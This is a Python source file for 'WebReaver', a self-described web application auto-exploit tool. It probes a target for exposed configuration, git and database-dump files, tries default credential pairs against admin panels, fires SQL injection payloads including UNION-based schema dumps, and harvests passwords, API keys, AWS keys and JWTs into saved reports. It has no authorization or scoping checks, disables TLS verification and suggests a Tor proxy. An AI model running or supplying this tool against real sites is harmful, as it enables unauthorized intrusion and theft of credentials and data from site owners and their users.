#!/usr/bin/env python3
"""
WebReaver — Automated Web Application Penetration & Extraction
Scans, exploits, and extracts data from web applications.
Targets: SQLi, file leaks, admin panels, API endpoints.
"""

import os
import sys
import re
import json
import time
import random
import urllib.parse
import urllib.request
import urllib.error
import socket
import ssl
import hashlib
import threading
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from datetime import datetime

# ── Colors ──
R = '\033[0m'
B = '\033[1m'
D = '\033[2m'
G = '\033[38;5;83m'
Y = '\033[38;5;214m'
Rc = '\033[38;5;196m'
C = '\033[38;5;51m'
A = '\033[38;5;198m'
K = '\033[38;5;220m'

VERSION = '1.0.0'
BANNER = f"""
 {C}╔═══════════════════════════════════════════════╗{R}
 {C}║{R}                                             {C}║{R}
 {C}║{R}  {K}__        ___    ______                   {C}║{R}
 {C}║{R}  {K}\\ \\      / / \\  |  _ \\    /\\              {C}║{R}
 {C}║{R}   {K}\\ \\    / / _ \\ | |_) |  /  \\    {D}Web{R}   {C}║{R}
 {C}║{R}    {K}\\ \\  / / ___ \\|  _ <  / /\\ \\   {D}Reaver{R}  {C}║{R}
 {C}║{R}     {K}\\ \\/ /_/   \\_\\_| \\_\\/_/  \\_\\          {C}║{R}
 {C}║{R}                                             {C}║{R}
 {C}║{R}         {D}Web App Auto-Exploit v{VERSION}{R}         {C}║{R}
 {C}║{R}            {D}by Adam-ZS{R}                     {C}║{R}
 {C}║{R}                                             {C}║{R}
 {C}╚═══════════════════════════════════════════════╝{R}
"""

THREADS = 10
TIMEOUT = 15
USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1-- -", "admin' --",
    "' UNION SELECT NULL-- -", "' UNION SELECT 1,2,3,4,5-- -",
    "1' AND SLEEP(3)-- -", "1' AND 1=1-- -", "1' AND 1=2-- -",
    "' OR 1=1#", "' ORDER BY 10-- -",
    "' UNION SELECT @@version,2,3,4,5-- -",
    "' UNION SELECT group_concat(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -",
]

SENSITIVE_PATHS = [
    '.env', '.git/config', '.git/HEAD', 'wp-config.php', 'wp-config.php.bak',
    'config.php', 'config.php.bak', 'config.inc.php',
    'admin/', 'administrator/', 'admin.php', 'login.php',
    'phpinfo.php', 'info.php', 'test.php', 'debug.php',
    'backup/', 'backups/', 'dump/', 'sql/',
    'robots.txt', 'sitemap.xml',
    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql',
    'database.sql', 'db.sql', 'db_backup.sql', 'dump.sql',
    'index.php?page=', 'index.php?id=',
    '.htaccess', '.htpasswd',
    'package.json', 'composer.json',
    'server-status', 'server-info',
]

ADMIN_PANELS = [
    'admin/', 'administrator/', 'adminpanel/', 'admin_area/',
    'cp/', 'controlpanel/', 'dashboard/', 'manager/',
    'backend/', 'panel/', 'login/', 'cms/',
    'wp-admin/', 'joomla/administrator/', 'drupal/',
]

COMMON_CREDS = [
    ('admin', 'admin'), ('admin', 'admin123'), ('admin', 'password'),
    ('admin', '12345678'), ('admin', 'admin@123'),
    ('administrator', 'admin'), ('administrator', 'admin123'),
    ('root', 'root'), ('root', 'toor'), ('root', 'admin'),
    ('user', 'user'), ('user', 'password'), ('user', '123456'),
    ('test', 'test'), ('guest', 'guest'),
    ('admin', 'letmein'), ('admin', 'welcome'), ('admin', 'Admin@123'),
    ('admin', 'p@ssw0rd'), ('admin', 'changeme'),
]

SENSITIVE_PATTERNS = {
    'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    'password': r'(?i)(pass|pwd|secret|token|key)[\"\']?\s*[:=]\s*[\"\'][^\"\']{4,}[\"\']',
    'api_key': r'(?i)(api[_-]?key|apikey|api[_-]?secret)[\"\']?\s*[:=]\s*[\"\'][^\"\']+[\"\']',
    'db_host': r'(?i)(db[_-]?host|dbhost|mysql[_-]?host)[\"\']?\s*[:=]\s*[\"\'][^\"\']+[\"\']',
    'db_user': r'(?i)(db[_-]?user|dbuser|mysql[_-]?user)[\"\']?\s*[:=]\s*[\"\'][^\"\']+[\"\']',
    'db_pass': r'(?i)(db[_-]?pass|dbpassword|mysql[_-]?pass)[\"\']?\s*[:=]\s*[\"\'][^\"\']+[\"\']',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'jwt': r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
}


class WebReaver:
    def __init__(self, target, threads=THREADS, proxy=None, output_dir=None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.proxy = proxy
        self.output_dir = output_dir or f'webreaver_{urlparse(target).hostname}_{int(time.time())}'

        u = urlparse(target)
        self.base = f"{u.scheme}://{u.netloc}"
        self.hostname = u.hostname
        self.scheme = u.scheme

        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'alive': False,
            'technologies': [],
            'sensitive_files': [],
            'sqli_points': [],
            'admin_panels': [],
            'emails_found': [],
            'credentials_found': [],
            'data_extracted': [],
            'vulnerabilities': [],
        }

        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

        os.makedirs(self.output_dir, exist_ok=True)

    def req(self, path, method='GET', data=None, headers=None):
        url = urljoin(self.base, path)
        hdrs = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        if headers:
            hdrs.update(headers)
        if data and isinstance(data, str):
            data = data.encode()
        if self.proxy:
            ph = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            opener = urllib.request.build_opener(ph)
        else:
            opener = urllib.request.build_opener()
        opener.addheaders = list(hdrs.items())
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            resp = opener.open(req, timeout=TIMEOUT)
            content = resp.read()
            return {'url': url, 'status': resp.status, 'headers': dict(resp.headers),
                    'content': content, 'text': content.decode('utf-8', errors='replace')}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
                return {'url': url, 'status': e.code, 'headers': dict(e.headers),
                        'content': body, 'text': body.decode('utf-8', errors='replace')}
            except:
                return {'url': url, 'status': e.code, 'headers': {}, 'content': b'', 'text': ''}
        except Exception as e:
            return {'url': url, 'status': 0, 'error': str(e)}

    def scan(self):
        print(f"\n  {C}═══════════════════════════════════{R}")
        print(f"  {B}WebReaver Scan — {K}{self.target}{R}")
        print(f"  {C}═══════════════════════════════════{R}\n")

        self.phase_check_alive()
        if not self.results['alive']:
            print(f"  {Rc}✖ Target not reachable{R}")
            return self.results

        self.phase_sensitive_files()
        self.phase_admin_panels()
        self.phase_sqli_detection()
        self.phase_extract_data()
        self.generate_report()
        return self.results

    def phase_check_alive(self):
        print(f"  {B}[1/5] Checking target...{R}")
        r = self.req('/')
        if r['status'] > 0:
            self.results['alive'] = True
            print(f"  {G}✔{R} Target is alive ({r['status']})")
            server = r['headers'].get('Server', '')
            if server:
                self.results['technologies'].append(server)
                print(f"  {D}  Server:{R} {server}")
            ct = r['headers'].get('X-Powered-By', '')
            if ct:
                self.results['technologies'].append(ct)
                print(f"  {D}  Powered:{R} {ct}")
            if 'php' in r['text'].lower():
                self.results['technologies'].append('PHP')
                print(f"  {D}  Detected:{R} PHP")
        else:
            print(f"  {Rc}✖ Target unreachable{R}")

    def phase_sensitive_files(self):
        print(f"\n  {B}[2/5] Hunting sensitive files...{R}")
        found = 0
        def check_path(path):
            r = self.req(path)
            if r['status'] in [200, 301, 302, 401, 403] and r.get('text'):
                return (path, r)
            return None
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(check_path, p): p for p in SENSITIVE_PATHS}
            for f in as_completed(futures):
                res = f.result()
                if res:
                    path, r = res
                    found += 1
                    info = {'path': path, 'status': r['status']}
                    secrets = self.extract_secrets(r['text'])
                    if secrets:
                        info['secrets'] = secrets
                        for s in secrets:
                            self.results['credentials_found'].append({'source': path, **s})
                    self.results['sensitive_files'].append(info)
                    sc = G if r['status'] == 200 else Y
                    print(f"  {sc}{r['status']}{R} {D}{path}{R}")
                    if secrets:
                        for s in secrets[:5]:
                            print(f"      {A}→{R} {D}{s['type']}:{R} {s['value'][:60]}")
        if found == 0:
            print(f"  {D}  None found{R}")
        else:
            print(f"  {G}✔{R} Found {K}{found}{R} files")

    def phase_admin_panels(self):
        print(f"\n  {B}[3/5] Finding admin panels...{R}")
        found = 0
        def check_admin(path):
            r = self.req(path)
            if r['status'] in [200, 301, 302] and r.get('text'):
                for username, password in COMMON_CREDS[:5]:
                    auth = base64.b64encode(f"{username}:{password}".encode()).decode()
                    r2 = self.req(path, headers={'Authorization': f'Basic {auth}'})
                    if r2['status'] == 200 and len(r2.get('text','')) > len(r.get('text','')):
                        return (path, r2['status'], f"Basic: {username}/{password}")
                return (path, r['status'], None)
            return None
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(check_admin, p): p for p in ADMIN_PANELS}
            for f in as_completed(futures):
                res = f.result()
                if res:
                    path, status, cred = res
                    found += 1
                    entry = {'path': path, 'status': status}
                    if cred:
                        entry['credentials'] = cred
                        self.results['credentials_found'].append({'source': path, 'type': 'admin_creds', 'value': cred})
                        print(f"  {G}{status}{R} {D}{path}{R}  {A}→ CRACKED: {cred}{R}")
                    else:
                        print(f"  {G}{status}{R} {D}{path}{R}")
                    self.results['admin_panels'].append(entry)
        if found == 0:
            print(f"  {D}  None found{R}")

    def phase_sqli_detection(self):
        print(f"\n  {B}[4/5] Testing SQL injection...{R}")
        r = self.req('/')
        if not r['text']:
            return
        params = re.findall(r'(?:page|id|pid|cat|view|article|news|product)=([^&\s"\'>]*)', r['text'])
        if not params:
            params = ['id', 'page', 'pid', 'cat', 'view', 'article']
        found = False
        for param in params[:10]:
            for payload in SQLI_PAYLOADS[:10]:
                test_url = f'/?{param}={urllib.parse.quote(payload)}'
                r2 = self.req(test_url)
                text = r2.get('text', '')
                if any(e in text.lower() for e in ['sql', 'mysql', 'syntax error', 'odbc', 'warning:']):
                    self.results['sqli_points'].append({'param': param, 'payload': payload, 'type': 'error', 'url': test_url})
                    self.results['vulnerabilities'].append(f"SQLi on {param}")
                    print(f"  {G}✔ SQLi{R} on {A}{param}{R}")
                    found = True
                    break
                if 'SLEEP' in payload:
                    start = time.time()
                    r2 = self.req(test_url)
                    if time.time() - start > 2:
                        self.results['sqli_points'].append({'param': param, 'payload': payload, 'type': 'time-based', 'url': test_url})
                        self.results['vulnerabilities'].append(f"SQLi (time) on {param}")
                        print(f"  {G}✔ SQLi{R} on {A}{param}{R} (time-based)")
                        found = True
                        break
            if found:
                break
        if not found:
            print(f"  {Y}  No obvious SQLi found (try --deep){R}")

    def phase_extract_data(self):
        print(f"\n  {B}[5/5] Extracting data...{R}")
        total = []
        for sf in self.results['sensitive_files']:
            r = self.req(sf['path'])
            secrets = self.extract_secrets(r.get('text', ''))
            total.extend(secrets)
        if total:
            data_file = os.path.join(self.output_dir, 'extracted_data.txt')
            with open(data_file, 'w') as f:
                for s in total:
                    f.write(f"[{s['type']}] {s['value']}\n")
            self.results['data_extracted'].append({'file': data_file, 'count': len(total)})
            print(f"  {G}✔{R} Saved {K}{len(total)}{R} secrets")
            types = {}
            for s in total:
                types[s['type']] = types.get(s['type'], 0) + 1
            for t, c in types.items():
                print(f"      {D}{t}:{R} {c}")

    def extract_secrets(self, text):
        secrets = []
        for name, pattern in SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, text)
            for m in matches[:50]:
                if m not in [s['value'] for s in secrets]:
                    secrets.append({'type': name, 'value': m.strip()})
        return secrets

    def generate_report(self):
        report_file = os.path.join(self.output_dir, 'report.json')
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        html_file = os.path.join(self.output_dir, 'report.html')
        with open(html_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html><head><title>WebReaver Report</title>
<style>
body{background:#0d0d0d;color:#c0c0c0;font-family:monospace;padding:20px}
h1{color:#0fc;border-bottom:1px solid #333}
h2{color:#fd0}
.stat{display:inline-block;padding:2px 8px;border-radius:3px;font-size:12px}
.stat-ok{background:#040;color:#0f0}
ul{list-style:none}
li{padding:3px 0}
li::before{content:"> ";color:#0fc}
pre{background:#111;padding:10px}
</style></head><body>
<h1>WebReaver — """ + self.target + """</h1>
<p>""" + self.results['timestamp'] + """</p>""")
            f.write(f"<h2>Sensitive Files ({len(self.results['sensitive_files'])})</h2><ul>")
            for sf in self.results['sensitive_files']:
                f.write(f"<li>{sf['path']} <span class='stat stat-ok'>{sf['status']}</span></li>")
            f.write(f"</ul><h2>Admin Panels ({len(self.results['admin_panels'])})</h2><ul>")
            for ap in self.results['admin_panels']:
                c = f" — {ap['credentials']}" if 'credentials' in ap else ''
                f.write(f"<li>{ap['path']} <span class='stat stat-ok'>{ap['status']}</span>{c}</li>")
            f.write(f"</ul><h2>SQLi ({len(self.results['sqli_points'])})</h2><ul>")
            for sq in self.results['sqli_points']:
                f.write(f"<li>{sq['param']} — {sq['type']}</li>")
            f.write("</ul><h2>Credentials</h2><ul>")
            for c in self.results['credentials_found']:
                f.write(f"<li>{c['source']} — {c['type']}: {str(c.get('value',''))[:60]}</li>")
            f.write("</ul></body></html>")
        print(f"\n  {B}Reports:{R} {D}{report_file}{R}, {D}{html_file}{R}")
        print(f"\n  {C}═══ Scan Complete ═══{R}")
        s = self.results
        print(f"  {D}{len(s['sensitive_files'])} files | {len(s['admin_panels'])} panels | {len(s['sqli_points'])} SQLi{R}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description='WebReaver — Web App Auto-Exploit')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--threads', '-t', type=int, default=THREADS, help='Thread count')
    parser.add_argument('--proxy', '-p', help='Proxy (e.g. socks5://127.0.0.1:9050)')
    parser.add_argument('--output', '-o', help='Output directory')
    parser.add_argument('--deep', action='store_true', help='Deep scan')
    args = parser.parse_args()
    os.system('clear')
    print(BANNER)
    wr = WebReaver(args.target, args.threads, args.proxy, args.output)
    wr.scan()


if __name__ == '__main__':
    main()
